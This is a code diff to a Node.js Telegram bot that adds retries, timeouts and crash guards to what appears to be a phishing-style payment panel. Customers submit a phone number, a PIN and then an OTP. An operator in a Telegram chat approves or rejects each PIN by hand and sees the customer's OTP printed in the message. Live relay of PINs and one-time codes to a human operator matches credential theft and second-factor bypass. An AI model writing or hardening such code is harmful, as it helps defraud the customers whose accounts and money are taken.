@@ -30,7 +30,7 @@ if (isPlaceholder(token) || isPlaceholder(adminChatId)) {
                 botEnabled = false;
             }
         });
-        bot.on('webhook_error', (err) => console.error('Telegram webhook error:', err.message || err));
+        bot.on('webhook_error', (err) => console.error('Telegram webhook error:', (err && err.message) || err));
     }
 }
 
@@ -62,19 +62,83 @@ function isEnabled() {
     return botEnabled && bot !== null;
 }
 
+// ── Reliable delivery ─────────────────────
+const MAX_ATTEMPTS = 3;
+const BASE_BACKOFF_MS = 300;
+const MAX_BACKOFF_MS = 5000;
+const REQUEST_TIMEOUT_MS = parseInt(process.env.TELEGRAM_TIMEOUT_MS || '10000', 10);
+
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms).unref?.());
+
+/**
+ * True when retrying could plausibly succeed. A 400/403 (bad token, blocked
+ * by the admin, malformed payload) is permanent — retrying only delays the
+ * failure and burns rate limit.
+ */
+function isRetryable(err) {
+    if (!err) return true;
+    const code = err.response?.statusCode || err.response?.body?.error_code;
+    if (code && code >= 400 && code < 500 && code !== 429) return false;
+    const message = String(err.message || '');
+    // Network-level failures are worth another attempt.
+    return /fetch failed|EFATAL|ETIMEDOUT|ECONNRESET|ENOTFOUND|socket hang up|network/i.test(message) || code === 429;
+}
+
+/** Rejects if `promise` has not settled within REQUEST_TIMEOUT_MS. */
+function withTimeout(promise, label) {
+    let timer = null;
+    const timeout = new Promise((_, reject) => {
+        timer = setTimeout(() => reject(new Error(`${label} timed out after ${REQUEST_TIMEOUT_MS}ms`)), REQUEST_TIMEOUT_MS);
+        timer.unref?.();
+    });
+    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
+}
+
+/**
+ * Calls a Telegram API method with a per-attempt timeout, bounded retries and
+ * exponential backoff. Never rejects: returns null so a Telegram outage can
+ * never take down a customer-facing request.
+ *
+ * @param {string} label     Human-readable operation name, used in logs.
+ * @param {() => Promise<any>} invoke The API call to attempt.
+ */
+async function callTelegram(label, invoke) {
+    let lastErr = null;
+    for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
+        try {
+            return await withTimeout(Promise.resolve().then(invoke), label);
+        } catch (err) {
+            lastErr = err;
+            const retryable = isRetryable(err);
+            console.error(
+                `Telegram ${label} failed (attempt ${attempt}/${MAX_ATTEMPTS}):`,
+                err && err.message ? err.message : String(err)
+            );
+            if (!retryable) {
+                console.error(`Telegram ${label}: not retrying (permanent error).`);
+                break;
+            }
+            if (attempt < MAX_ATTEMPTS) {
+                // 300ms, 600ms — jitter avoids a thundering herd of retries.
+                const backoff = Math.min(BASE_BACKOFF_MS * 2 ** (attempt - 1), MAX_BACKOFF_MS);
+                await sleep(backoff + Math.floor(Math.random() * 100));
+            }
+        }
+    }
+    auditLog.write('TELEGRAM_ERROR', { operation: label, message: lastErr?.message || 'unknown' });
+    return null;
+}
+
 function send(text, extra = {}) {
     if (!isEnabled()) return Promise.resolve(null);
-    return bot.sendMessage(adminChatId, text, extra).catch((err) => {
-        console.error('Telegram send failed:', err.message);
-        return null;
-    });
+    return callTelegram('sendMessage', () => bot.sendMessage(adminChatId, text, extra));
 }
 
 function editAdminMessage(messageId, text) {
     if (!isEnabled() || !messageId) return Promise.resolve(null);
-    return bot
-        .editMessageText(text, { chat_id: adminChatId, message_id: messageId })
-        .catch(() => null);
+    return callTelegram('editMessageText', () =>
+        bot.editMessageText(text, { chat_id: adminChatId, message_id: messageId })
+    );
 }
 
 function orderSummary(req) {
@@ -127,17 +191,21 @@ function registerCommand(command, adminOnly, buildReply) {
     bot.onText(new RegExp(`^\\${command}(?:\\s|$)`), async (msg) => {
         const chatId = msg.chat.id;
 
-        if (adminOnly && String(chatId) !== String(adminChatId)) {
-            await bot.sendMessage(chatId, '❌ Only the admin can use this command.');
-            auditLog.write('BOT_COMMAND_REJECTED', { command, userId: String(chatId) });
-            return;
-        }
-
-        auditLog.write('BOT_COMMAND', { command, userId: String(chatId) });
-
+        // A handler that throws would otherwise become an unhandled rejection
+        // and take the polling loop with it.
         try {
+            if (adminOnly && String(chatId) !== String(adminChatId)) {
+                await callTelegram('commandReply', () => bot.sendMessage(chatId, '❌ Only the admin can use this command.'));
+                auditLog.write('BOT_COMMAND_REJECTED', { command, userId: String(chatId) });
+                return;
+            }
+
+            auditLog.write('BOT_COMMAND', { command, userId: String(chatId) });
+
             const text = await buildReply(msg, chatId);
-            if (text) await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+            if (text) {
+                await callTelegram('commandReply', () => bot.sendMessage(chatId, text, { parse_mode: 'Markdown' }));
+            }
         } catch (err) {
             console.error(`Bot command ${command} failed:`, err.message);
             auditLog.write('BOT_COMMAND_ERROR', { command, userId: String(chatId), message: err.message });
@@ -163,10 +231,14 @@ if (isEnabled()) {
     });
 
     bot.on('callback_query', async (query) => {
-        const chatId = query.message.chat.id;
+        // query.message is absent for callbacks sent from an inline message, so
+        // reading .chat.id unguarded would throw and kill the polling loop.
+        const chatId = query.message?.chat?.id;
+        const answer = (text) =>
+            callTelegram('answerCallbackQuery', () => bot.answerCallbackQuery(query.id, { text }));
 
-        if (String(chatId) !== String(adminChatId)) {
-            await bot.answerCallbackQuery(query.id, { text: '❌ Not authorised.' });
+        if (!chatId || String(chatId) !== String(adminChatId)) {
+            await answer('❌ Not authorised.');
             auditLog.write('UNAUTHORIZED_CALLBACK', { userId: String(chatId), data: query.data });
             return;
         }
@@ -179,7 +251,7 @@ if (isEnabled()) {
         // Reject unknown actions before they reach the audit log, so a crafted
         // callback payload cannot write arbitrary strings into the trail.
         if (!ALLOWED_ACTIONS.has(action)) {
-            await bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
+            await answer('Unknown action.');
             auditLog.write('UNKNOWN_CALLBACK', { userId: String(chatId), action: String(action).slice(0, 32) });
             return;
         }
@@ -187,7 +259,7 @@ if (isEnabled()) {
         const request = approvals.get(requestId);
 
         if (!request) {
-            await bot.answerCallbackQuery(query.id, { text: '⚠️ Request not found or expired.' });
+            await answer('⚠️ Request not found or expired.');
             return;
         }
 
@@ -202,7 +274,7 @@ if (isEnabled()) {
                     messageId,
                     `✅ PIN accepted — waiting for the customer's OTP.\n\n${orderSummary(request)}`
                 );
-                await bot.answerCallbackQuery(query.id, { text: '✅ Customer can now enter the OTP' });
+                await answer('✅ Customer can now enter the OTP');
                 request.timeoutTimer = setTimeout(() => {
                     // Only expire while we are still waiting for the customer's OTP.
                     // Once an OTP arrives (otp_pending/wrong_otp) the request must stay
@@ -219,21 +291,21 @@ if (isEnabled()) {
             case 'wrong_pin': {
                 finalize(request, 'wrong_pin');
                 await editAdminMessage(messageId, `❌ Wrong PIN — customer asked to re-enter.\n\n${orderSummary(request)}`);
-                await bot.answerCallbackQuery(query.id, { text: '❌ Customer will re-enter phone + PIN' });
+                await answer('❌ Customer will re-enter phone + PIN');
                 break;
             }
 
             case 'reject': {
                 finalize(request, 'rejected');
                 await editAdminMessage(messageId, `❌ Payment rejected.\n\n${orderSummary(request)}`);
-                await bot.answerCallbackQuery(query.id, { text: '❌ Rejected' });
+                await answer('❌ Rejected');
                 break;
             }
 
             case 'invalid': {
                 finalize(request, 'invalid');
                 await editAdminMessage(messageId, `⚠️ Marked as invalid information.\n\n${orderSummary(request)}`);
-                await bot.answerCallbackQuery(query.id, { text: '⚠️ Marked invalid' });
+                await answer('⚠️ Marked invalid');
                 break;
             }
 
@@ -243,7 +315,7 @@ if (isEnabled()) {
                     request.adminOtpMessageId || messageId,
                     `✅ OTP verified — payment complete.\n\n${orderSummary(request)}\n🔢 OTP: ${request.otp}`
                 );
-                await bot.answerCallbackQuery(query.id, { text: '✅ Payment completed' });
+                await answer('✅ Payment completed');
                 break;
             }
 
@@ -255,12 +327,12 @@ if (isEnabled()) {
                     request.adminOtpMessageId || messageId,
                     `❌ Wrong OTP — customer asked to re-enter.\n\n${orderSummary(request)}`
                 );
-                await bot.answerCallbackQuery(query.id, { text: '❌ Customer will re-enter the OTP' });
+                await answer('❌ Customer will re-enter the OTP');
                 break;
             }
 
             default:
-                await bot.answerCallbackQuery(query.id, { text: 'Unknown action.' });
+                await answer('Unknown action.');
         }
     });
 }
